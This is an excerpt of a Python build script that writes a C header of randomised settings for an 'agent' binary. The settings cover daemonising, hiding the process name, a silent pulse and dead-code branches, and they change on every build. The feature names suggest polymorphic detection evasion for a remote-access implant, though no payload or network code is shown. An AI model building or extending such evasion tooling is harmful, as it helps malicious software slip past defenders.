...
def main():
    parser = argparse.ArgumentParser(
        description="Build-time polymorphic configuration generator for the agent.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Writes poly_cfg.h with random POLY_DAEMON / POLY_EXEC_CMD /\n"
            "POLY_HIDE_NAME / POLY_SILENTPULSE / POLY_DEAD_CONST values.\n"
            "Each invocation picks a different combination, so every poly build\n"
            "compiles different code paths into the agent binary.\n"
            "Called by the Makefile; can also be run standalone."
        ),
    )
    parser.add_argument(
        "output", nargs="?", default="src/poly_cfg.h", metavar="output.h",
        help="output C header path (default: src/poly_cfg.h)",
    )
    a = parser.parse_args()
    out = a.output
    ...
    with open(out, "w", encoding="utf-8") as f:
        ...
        f.write("/* non-zero seed used by poly_stubs.h dead branches */\n")
    ...
    # ── Console summary ───────────────────────────────────────────────────────
    print(
        f"[gen_poly_cfg] DAEMON={POLY_DAEMON}({desc['POLY_DAEMON'][POLY_DAEMON]}) "
